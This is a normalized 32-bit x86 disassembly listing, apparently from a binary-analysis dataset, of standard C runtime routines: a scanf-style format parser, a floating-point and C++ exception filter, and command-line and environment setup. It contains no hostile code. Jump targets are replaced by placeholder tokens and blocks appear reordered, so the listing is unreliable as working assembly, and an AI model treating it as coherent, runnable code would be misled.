jne r-xdata
pop ebp
retn
and eax 0xffffffdf
sub eax 0x7
sub_200919b
mov edi edi
push ebp
mov ebp esp
push ebx
mov eax ebx
pop ebx
pop ebp
retn
movzx eax bl
push eax
call sub_200dcb2
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
inc [ esi ]
call sub_2009172
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub_20091c5
mov edi edi
push ebp
mov ebp esp
sub esp 0x1fc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
push edi
mov edi [ ebp + 0xc ]
mov [ ebp - 0x1e4 ] ecx
lea ecx [ ebp - 0x184 ]
mov [ ebp - 0x19c ] eax
mov [ ebp - 0x1ac ] ecx
mov [ ebp - 0x1dc ] 0x15e
mov [ ebp - 0x1d0 ] esi
mov [ ebp - 0x1e8 ] esi
mov [ ebp - 0x188 ] esi
cmp edi esi
jne r-xdata
cmp eax esi
je r-xdata
call sub_20047ce
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
push ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_2002d91
leave
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x1f8 ]
call sub_200144c
mov al [ edi ]
mov [ ebp - 0x19d ] 0x0
mov [ ebp - 0x18c ] esi
mov [ ebp - 0x1c4 ] esi
test al al
je r-xdata
push eax
call sub_200788d
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x1ec ] 0x0
je r-xdata
mov esi [ ebp - 0x19c ]
movzx eax al
push eax
call sub_200dcb2
pop ecx
test eax eax
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0x1c4 ]
mov eax [ ebp - 0x1f0 ]
and [ eax + 0x70 ] 0xfffffffd
mov al [ edi ]
cmp al 0x25
jne r-xdata
dec [ ebp - 0x18c ]
push esi
push esi
lea esi [ ebp - 0x18c ]
call sub_200919b
pop ecx
push eax
call sub_2009188
pop ecx
pop ecx
call sub_20047ce
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_2004766
add esp 0x14
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
inc [ ebp - 0x18c ]
mov edx esi
call sub_2009172
mov ebx eax
movzx eax [ edi ]
inc edi
mov [ ebp - 0x188 ] ebx
mov [ ebp - 0x1b8 ] edi
cmp eax ebx
jne r-xdata
cmp [ edi + 0x1 ] al
je r-xdata
inc edi
movzx eax [ edi ]
push eax
call sub_200dcb2
pop ecx
test eax eax
jne r-xdata
jmp r-xdata
pop ebx
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
push esi
push ebx
jmp r-xdata
movzx eax bl
push eax
call sub_2008977
pop ecx
test eax eax
je r-xdata
cmp al 0x25
jne r-xdata
xor esi esi
mov [ ebp - 0x1c0 ] esi
mov [ ebp - 0x1d1 ] 0x0
mov [ ebp - 0x1a8 ] esi
mov [ ebp - 0x1b4 ] esi
mov [ ebp - 0x194 ] esi
mov [ ebp - 0x19f ] 0x0
mov [ ebp - 0x1a0 ] 0x0
mov [ ebp - 0x196 ] 0x0
mov [ ebp - 0x1ad ] 0x0
mov [ ebp - 0x19e ] 0x0
mov [ ebp - 0x18d ] 0x0
mov [ ebp - 0x195 ] 0x1
mov [ ebp - 0x1d8 ] esi
mov al [ edi ]
test al al
jne r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
call sub_2009188
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp - 0x188 ] 0xffffffff
jne r-xdata
inc [ ebp - 0x18c ]
mov edx esi
call sub_2009172
movzx ecx [ edi ]
inc edi
mov [ ebp - 0x1b8 ] edi
cmp ecx eax
jne r-xdata
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x25
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0x194 ]
inc [ ebp - 0x1b4 ]
imul eax eax 0xa
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x194 ] eax
jmp r-xdata
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
cmp [ ebp - 0x1d0 ] 0x1
jne r-xdata
cmp [ edi ] 0x25
jne r-xdata
push esi
push eax
call sub_2009188
push esi
push ebx
call sub_2009188
add esp 0x10
dec [ ebp - 0x18c ]
mov edi eax
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0x1ad ] 0x0
je r-xdata
cmp [ ebp - 0x188 ] 0xffffffff
jne r-xdata
push [ ebp - 0x1ac ]
call sub_20016b0
pop ecx
mov eax [ ebp - 0x1b8 ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
dec [ ebp - 0x195 ]
dec [ ebp - 0x18d ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
inc edi
movzx ebx [ edi ]
movzx eax bl
push eax
call sub_200dbad
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x196 ] 0x0
mov [ ebp - 0x1b8 ] edi
jne r-xdata
mov eax [ ebp - 0x1c4 ]
test eax eax
jne r-xdata
mov edi eax
lea eax [ edi + 0x1 ]
cmp [ eax ] 0x6c
je r-xdata
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x196 ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
xor esi esi
mov eax [ ebp - 0x1e4 ]
mov esi [ eax ]
mov [ ebp - 0x1fc ] eax
add eax 0x4
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
cmp [ ebp - 0x1ec ] 0x0
je r-xdata
cmp [ ebp - 0x19d ] al
jne r-xdata
inc [ ebp - 0x1d8 ]
mov edi eax
mov [ ebp - 0x1cc ] esi
mov [ ebp - 0x1c8 ] esi
jmp r-xdata
inc [ ebp - 0x195 ]
inc [ ebp - 0x18d ]
jmp r-xdata
inc [ ebp - 0x1ad ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
movzx eax [ edi ]
or eax 0x20
mov [ ebp - 0x1a4 ] eax
cmp eax 0x6e
je r-xdata
mov al [ edi ]
cmp al 0x53
je r-xdata
xor bl bl
mov [ ebp - 0x1bc ] esi
cmp [ ebp - 0x18d ] bl
jne r-xdata
mov ecx [ ebp - 0x1f0 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
mov cl [ edi + 0x1 ]
cmp cl 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x1b4 ]
test ecx ecx
je r-xdata
cmp eax 0x63
je r-xdata
mov [ ebp - 0x18d ] 0x1
mov [ ebp - 0x18d ] 0xff
cmp al 0x43
jne r-xdata
cmp cl 0x33
jne r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x195 ]
jmp r-xdata
mov eax [ ebp - 0x1a4 ]
cmp eax 0x6f
jg r-xdata
cmp [ ebp - 0x194 ] 0x0
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_2009172
cmp eax 0x7b
je r-xdata
cmp cl 0x64
je r-xdata
lea eax [ edi + 0x2 ]
cmp [ eax ] 0x32
jne r-xdata
sub eax 0x70
je r-xdata
je r-xdata
push [ ebp - 0x19c ]
push [ ebp - 0x188 ]
mov esi [ ebp - 0x1bc ]
mov edi [ ebp - 0x1b8 ]
push [ ebp - 0x19c ]
lea esi [ ebp - 0x18c ]
call sub_200919b
pop ecx
jmp r-xdata
cmp cl 0x69
je r-xdata
mov edi eax
jmp r-xdata
mov [ ebp - 0x195 ] 0x1
sub eax 0x3
je r-xdata
cmp [ ebp - 0x188 ] 0x2d
jne r-xdata
cmp eax 0x63
je r-xdata
mov [ ebp - 0x188 ] eax
cmp eax 0xffffffff
je r-xdata
cmp cl 0x6f
je r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov [ ebp - 0x1a0 ] 0x1
jmp r-xdata
cmp [ ebp - 0x18d ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
push 0x64
pop edx
cmp eax edx
je r-xdata
cmp cl 0x78
je r-xdata
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
dec [ ebp - 0x194 ]
jne r-xdata
mov edi [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push edi
push [ ebp - 0x188 ]
mov [ ebp - 0x1c0 ] esi
call sub_2009188
pop ecx
pop ecx
mov [ ebp - 0x19e ] 0x1
sub eax 0x3
je r-xdata
inc [ ebp - 0x194 ]
mov [ ebp - 0x1b4 ] 0x1
jle r-xdata
cmp cl 0x58
jne r-xdata
mov edi [ ebp - 0x1c0 ]
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_2009172
mov [ ebp - 0x188 ] eax
test ecx ecx
je r-xdata
inc [ ebp - 0x18c ]
mov edx edi
call sub_2009172
mov [ ebp - 0x188 ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
cmp [ ebp - 0x188 ] 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
movzx eax [ edi ]
cmp eax [ ebp - 0x188 ]
jne r-xdata
cmp eax 0x67
jle r-xdata
jmp r-xdata
cmp [ ebp - 0x1a0 ] 0x0
je r-xdata
cmp [ ebp - 0x1a4 ] 0x78
je r-xdata
cmp [ ebp - 0x1a0 ] 0x0
mov edi [ ebp - 0x1c0 ]
je r-xdata
cmp [ ebp - 0x1a4 ] 0x78
je r-xdata
mov bl 0x1
jmp r-xdata
dec [ ebp - 0x18c ]
push edi
push eax
call sub_2009188
pop ecx
pop ecx
cmp [ ebp - 0x1a4 ] 0x63
je r-xdata
cmp [ ebp - 0x1c0 ] esi
je r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov [ ebp - 0x1a0 ] 0x1
jmp r-xdata
cmp [ ebp - 0x18d ] 0x0
jle r-xdata
dec [ ebp - 0x19d ]
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x188 ] 0x2d
jne r-xdata
cmp eax 0x69
je r-xdata
cmp [ ebp - 0x1a4 ] 0x46
jne r-xdata
neg edi
movzx eax [ ebp - 0x188 ]
push eax
call sub_200dc31
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x1a4 ] 0x70
je r-xdata
mov eax [ ebp - 0x1cc ]
mov ecx [ ebp - 0x1c8 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x1cc ] eax
mov [ ebp - 0x1c8 ] ecx
jmp r-xdata
movzx eax [ ebp - 0x188 ]
push eax
call sub_200dc31
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x1a4 ] 0x70
je r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp [ ebp - 0x1a4 ] 0x73
jne r-xdata
push 0x30
pop esi
cmp [ ebp - 0x188 ] esi
jne r-xdata
dec [ ebp - 0x194 ]
jne r-xdata
inc edi
cmp [ edi ] 0x5e
mov esi edi
jne r-xdata
mov [ ebp - 0x19e ] 0x1
mov edi [ ebp - 0x1b8 ]
inc [ ebp - 0x19d ]
inc edi
mov [ ebp - 0x1b8 ] edi
jmp r-xdata
mov eax [ ebp - 0x1fc ]
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1ac ]
mov [ eax ] 0x2d
inc ebx
jmp r-xdata
mov [ ebp - 0x1a4 ] edx
cmp eax 0x6e
jne r-xdata
cmp [ ebp - 0x1a8 ] 0x0
je r-xdata
and [ ebp - 0x1a8 ] 0x0
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_2009188
pop ecx
pop ecx
push [ ebp - 0x188 ]
shl edi 0x4
call sub_2009152
pop ecx
mov [ ebp - 0x188 ] eax
movzx eax [ ebp - 0x188 ]
push eax
call sub_200dbad
pop ecx
test eax eax
je r-xdata
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_2009188
pop ecx
pop ecx
mov esi [ ebp - 0x1cc ]
mov edi [ ebp - 0x1c8 ]
push [ ebp - 0x188 ]
shld edi esi 0x4
shl esi 0x4
call sub_2009152
pop ecx
mov [ ebp - 0x188 ] eax
movzx eax [ ebp - 0x188 ]
push eax
call sub_200dbad
pop ecx
test eax eax
je r-xdata
inc [ ebp - 0x1c4 ]
cmp [ ebp - 0x1a4 ] 0x63
je r-xdata
inc [ ebp - 0x1c0 ]
jmp r-xdata
cmp [ ebp - 0x19e ] 0x0
je r-xdata
cmp [ ebp - 0x1a4 ] 0x7b
jne r-xdata
cmp eax 0x9
jl r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_2009172
mov [ ebp - 0x188 ] eax
cmp al 0x78
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_2009172
mov [ ebp - 0x188 ] eax
test ecx ecx
je r-xdata
push 0x20
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_2007940
add esp 0xc
cmp [ esi ] 0x5d
jne r-xdata
lea esi [ edi + 0x1 ]
mov [ ebp - 0x19f ] 0xff
cmp [ ebp - 0x1b4 ] 0x0
jne r-xdata
dec [ ebp - 0x194 ]
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_2009172
mov [ ebp - 0x188 ] eax
cmp [ ebp - 0x196 ] 0x0
mov edi [ ebp - 0x18c ]
je r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_2009172
mov [ ebp - 0x188 ] eax
jmp r-xdata
dec [ ebp - 0x194 ]
je r-xdata
cmp [ ebp - 0x1a4 ] 0x6f
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_2009172
mov [ ebp - 0x188 ] eax
jmp r-xdata
dec [ ebp - 0x194 ]
je r-xdata
cmp [ ebp - 0x1a4 ] 0x6f
jne r-xdata
cmp [ ebp - 0x19e ] 0x0
je r-xdata
cmp [ ebp - 0x1b4 ] 0x0
je r-xdata
mov [ esi ] al
inc esi
mov [ ebp - 0x1e0 ] al
movzx eax al
push eax
call sub_2008977
pop ecx
test eax eax
je r-xdata
movsx ebx [ ebp - 0x19f ]
xor edx edx
mov ecx eax
and ecx 0x7
inc edx
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x24 ]
xor ecx ebx
test ecx edx
je r-xdata
cmp eax 0x20
jne r-xdata
cmp eax 0xd
jle r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_2009172
cmp [ ebp - 0x1b4 ] 0x0
mov [ ebp - 0x188 ] eax
je r-xdata
cmp al 0x58
je r-xdata
mov bl 0x1
jmp r-xdata
mov dl [ ebp - 0x1d1 ]
jmp r-xdata
mov dl 0x5d
inc esi
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
movzx eax [ ebp - 0x188 ]
jmp r-xdata
or [ ebp - 0x194 ] 0xffffffff
cmp [ ebp - 0x1d8 ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x1c4 ]
mov esi [ ebp - 0x1bc ]
imul edi edi 0xa
jmp r-xdata
cmp [ ebp - 0x188 ] 0x38
jge r-xdata
push 0x0
push 0xa
push [ ebp - 0x1c8 ]
push [ ebp - 0x1cc ]
call sub_200c470
mov esi eax
mov edi edx
jmp r-xdata
cmp [ ebp - 0x188 ] 0x38
jge r-xdata
mov eax [ ebp - 0x1bc ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1bc ]
xor eax eax
mov [ ecx ] ax
jmp r-xdata
lea eax [ ebp - 0x1f8 ]
push eax
mov eax [ ebp - 0x1f8 ]
mov [ ebp - 0x1e8 ] 0x3f
push [ eax + 0xac ]
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x1e8 ]
push eax
call sub_200d654
mov ax [ ebp - 0x1e8 ]
add esp 0x10
mov [ esi ] ax
inc esi
inc esi
jmp r-xdata
inc [ ebp - 0x18c ]
mov edx edi
call sub_2009172
mov [ ebp - 0x1df ] al
mov [ ebp - 0x1a4 ] 0x78
jmp r-xdata
sub [ ebp - 0x194 ] 0x2
cmp [ ebp - 0x194 ] 0x1
jge r-xdata
cmp [ ebp - 0x1a4 ] 0x78
mov [ ebp - 0x1a8 ] 0x1
je r-xdata
mov al [ esi ]
cmp al 0x5d
jne r-xdata
push eax
call sub_200dbad
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x195 ] 0x0
je r-xdata
mov eax [ ebp - 0x1cc ]
mov [ esi ] eax
mov eax [ ebp - 0x1c8 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
inc [ ebp - 0x1a8 ]
cmp [ ebp - 0x1b4 ] 0x0
mov eax [ ebp - 0x188 ]
lea edi [ edi + eax - 0x30 ]
je r-xdata
shl edi 0x3
jmp r-xdata
mov eax [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
add eax 0xffffffd0
cdq
add esi eax
adc edi edx
cmp [ ebp - 0x1b4 ] 0x0
mov [ ebp - 0x1cc ] esi
mov [ ebp - 0x1c8 ] edi
je r-xdata
mov esi [ ebp - 0x1cc ]
mov edi [ ebp - 0x1c8 ]
shld edi esi 0x3
shl esi 0x3
jmp r-xdata
mov [ ebp - 0x1bc ] esi
jmp r-xdata
inc bl
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push eax
call sub_2009188
pop ecx
pop ecx
mov [ ebp - 0x188 ] esi
jmp r-xdata
cmp [ ebp - 0x1b4 ] 0x0
je r-xdata
inc esi
cmp al 0x2d
jne r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1f8 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ ebp - 0x19f ] al
cmp al [ ebp - 0x188 ]
jne r-xdata
mov [ esi ] di
mov [ esi ] edi
jmp r-xdata
mov [ ebp - 0x1a4 ] 0x6f
jmp r-xdata
dec [ ebp - 0x194 ]
jne r-xdata
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
test dl dl
je r-xdata
mov [ ebp - 0x1b8 ] esi
mov esi [ ebp - 0x1bc ]
jmp r-xdata
mov al [ ebp - 0x188 ]
mov ecx [ ebp - 0x1ac ]
inc [ ebp - 0x1a8 ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_20090fb
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x1a8 ] 0x0
je r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
inc bl
mov cl [ esi ]
cmp cl 0x5d
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_2009172
mov [ ebp - 0x188 ] eax
movzx eax al
push [ ebp - 0x19c ]
dec [ ebp - 0x18c ]
push [ ebp - 0x188 ]
call sub_2009188
cmp [ ebp - 0x1a8 ] 0x0
pop ecx
pop ecx
je r-xdata
cmp [ ebp - 0x188 ] 0x65
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_2009172
mov ecx [ ebp - 0x1ac ]
mov [ ebp - 0x188 ] eax
mov al [ ebp - 0x19f ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_20090fb
add esp 0xc
test eax eax
je r-xdata
inc esi
cmp dl cl
jae r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
cmp [ ebp - 0x188 ] 0x45
jne r-xdata
movzx eax [ ebp - 0x188 ]
jmp r-xdata
mov al dl
mov dl cl
mov al cl
jmp r-xdata
mov eax [ ebp - 0x1ac ]
inc [ ebp - 0x1c4 ]
lea ecx [ ebp - 0x1f8 ]
push ecx
push eax
push [ ebp - 0x1bc ]
mov [ ebx + eax ] 0x0
movsx eax [ ebp - 0x195 ]
dec eax
push eax
push [ rw-data ]
call sub_2003ff8
pop ecx
call eax
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x1ac ]
mov [ ebx + eax ] 0x65
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_20090fb
add esp 0xc
test eax eax
je r-xdata
push eax
call sub_200dbad
pop ecx
test eax eax
jne r-xdata
xor dl dl
jmp r-xdata
sub al dl
inc al
movzx edi dl
movzx edx al
cmp dl al
ja r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_2009172
mov [ ebp - 0x188 ] eax
cmp eax 0x2d
jne r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov ecx edi
and ecx 0x7
mov eax edi
mov bl 0x1
shl bl cl
shr eax 0x3
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
inc edi
dec edx
jne r-xdata
cmp [ ebp - 0x188 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1ac ]
mov [ ebx + eax ] 0x2d
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
call sub_20090fb
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp - 0x1ac ]
mov cl [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_20090fb
add esp 0xc
test eax eax
je r-xdata
movzx eax [ ebp - 0x188 ]
jmp r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
jne r-xdata
jmp r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_2009172
mov [ ebp - 0x188 ] eax
movzx eax al
push eax
call sub_200dbad
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_2009172
mov [ ebp - 0x188 ] eax
and [ ebp - 0x194 ] eax
jmp r-xdata
mov eax [ ebp - 0x194 ]
dec [ ebp - 0x194 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1ac ]
mov cl [ ebp - 0x188 ]
inc [ ebp - 0x1a8 ]
mov [ ebx + eax ] cl
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1ac ]
lea esi [ ebp - 0x1dc ]
call sub_20090fb
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebp - 0x19c ]
inc [ ebp - 0x18c ]
call sub_2009172
mov [ ebp - 0x188 ] eax
movzx eax al
sub_200a182
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe06d7363
jne r-xdata
xor eax eax
pop ebp
retn 0x4
cmp [ eax + 0x10 ] 0x3
jne r-xdata
mov eax [ eax + 0x14 ]
cmp eax 0x19930520
je r-xdata
call sub_200ad6d
cmp eax 0x19930521
je r-xdata
cmp eax 0x19930522
je r-xdata
cmp eax 0x1994000
jne r-xdata
sub_200a1d3
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_20041cb
mov esi eax
test esi esi
je r-xdata
pop esi
leave
retn
mov edx [ esi + 0x5c ]
mov eax [ rw-data ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
push ebx
imul eax eax 0xc
add eax edx
cmp ecx eax
jae r-xdata
mov ebx eax
imul ebx ebx 0xc
add ecx 0xc
add ebx edx
cmp ecx ebx
jb r-xdata
xor eax eax
cmp [ ecx ] edi
jne r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
jmp r-xdata
mov ebx [ eax + 0x8 ]
mov [ ebp - 0x4 ] ebx
test ebx ebx
jne r-xdata
mov eax ecx
jmp r-xdata
pop ebx
pop edi
cmp ebx 0x5
jne r-xdata
test eax eax
je r-xdata
cmp ebx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ esi + 0x60 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call ebx
mov ecx [ rw-data ]
mov edi [ rw-data ]
mov edx ecx
add edi ecx
cmp edx edi
jge r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
imul ecx ecx 0xc
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
mov edi [ rw-data ]
mov ebx [ rw-data ]
inc edx
add ebx edi
add ecx 0xc
cmp edx ebx
jl r-xdata
mov ebx [ ebp - 0x4 ]
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call ebx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x60 ] eax
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
mov [ esi + 0x64 ] 0x8a
sub_200a333
mov edi edi
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ rw-data ]
test esi esi
jne r-xdata
call sub_2003c3a
mov al [ esi ]
cmp al 0x20
ja r-xdata
mov esi r--data
cmp al 0x22
jne r-xdata
test al al
je r-xdata
movzx eax al
push eax
call sub_200de24
pop ecx
test eax eax
je r-xdata
xor ecx ecx
test edi edi
sete cl
mov edi ecx
pop edi
mov eax esi
pop esi
retn
test edi edi
je r-xdata
inc esi
jmp r-xdata
inc esi
mov al [ esi ]
test al al
jne r-xdata
cmp al 0x20
ja r-xdata
inc esi
sub_200a392
cmp [ rw-data ] 0x0
jne r-xdata
push esi
mov esi [ rw-data ]
push edi
xor edi edi
test esi esi
jne r-xdata
call sub_2003c3a
mov al [ esi ]
test al al
jne r-xdata
or eax 0xffffffff
jmp r-xdata
cmp al 0x3d
je r-xdata
push 0x4
inc edi
push edi
call sub_200b579
mov edi eax
pop ecx
pop ecx
mov [ rw-data ] edi
test edi edi
je r-xdata
pop edi
pop esi
retn
push esi
call sub_2009070
pop ecx
lea esi [ esi + eax + 0x1 ]
inc edi
mov esi [ rw-data ]
push ebx
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
push esi
call sub_2009070
mov ebx eax
inc ebx
cmp [ esi ] 0x3d
pop ecx
je r-xdata
push [ rw-data ]
call sub_20016b0
and [ rw-data ] 0x0
and [ edi ] 0x0
mov [ rw-data ] 0x1
xor eax eax
add esi ebx
push 0x1
push ebx
call sub_200b579
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
push [ rw-data ]
call sub_20016b0
and [ rw-data ] 0x0
or eax 0xffffffff
jmp r-xdata
push esi
push ebx
push eax
call sub_2001ec1
add esp 0xc
test eax eax
je r-xdata
pop ecx
pop ebx
add edi 0x4
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_200463e
add esp 0x14
sub_200a470
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x10 ]
push ebx
xor eax eax
push esi
mov [ edi ] eax
mov esi edx
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
add [ ebp + 0x8 ] 0x4
mov [ ebx ] edx
inc [ edi ]
test edx edx
je r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
mov bl 0x22
sete al
inc esi
mov [ ebp - 0x4 ] eax
jmp r-xdata
